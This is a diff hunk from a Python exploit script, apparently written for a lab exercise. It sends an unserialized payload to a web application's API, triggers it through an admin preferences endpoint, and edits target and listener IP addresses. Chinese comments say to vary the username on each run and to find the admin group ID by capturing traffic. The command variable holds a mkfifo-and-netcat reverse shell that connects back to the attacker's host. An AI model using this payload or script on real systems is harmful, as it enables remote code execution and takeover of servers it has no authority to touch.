@@ -83,18 +83,18 @@ def unserialized_payload(base_url, admin_token, command):
     else:
         print("[+] Unserialized payload sent!")
         print("[+] Trigger the payload by visiting the admin preferences page!")
-        requests.get("%s/api/update-preferences?user_id=10" %base_url,headers=headers,cookies=cookies)
+        requests.get("%s/api/get-preferences?user_id=10" %base_url,headers=headers,cookies=cookies)
 
     return
 
 if __name__ == "__main__":
-    base_url = "http://192.168.145.245:8000"
-    username = "carlos5"
-    password = "carlos5"
-    lhost = "192.168.45.186"
+    base_url = "http://192.168.149.245:8000"
+    username = "carlos5" # 任意用户名, 每一次执行用户名需要变更
+    password = "carlos5" # 任意密码
+    lhost = "192.168.45.234" # 修改为反弹shell的ip
     lport = "443"
     command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
-    group_id = 13
+    group_id = 13 # admin组的ID, 可以通过抓包获取
 
     async def main():
         global cookie_result
